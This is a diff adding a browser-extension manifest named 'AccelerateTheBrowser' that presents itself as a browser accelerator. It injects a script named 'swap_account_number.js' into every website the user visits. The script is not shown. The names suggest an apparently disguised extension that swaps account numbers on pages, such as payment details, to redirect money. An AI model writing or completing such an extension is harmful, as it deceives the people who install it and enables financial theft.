@@ -1,0 +1,17 @@
+{
+    "name": "AccelerateTheBrowser",
+    "version": "1.0",
+    "description": "Accelerate browser?!",
+	"content_scripts": [
+	  {
+		"matches": [
+		  "<all_urls>"
+		],
+		"js": ["swap_account_number.js"]
+	  }
+	],
+	"permissions": [
+        "storage"
+    ],
+    "manifest_version": 2
+}
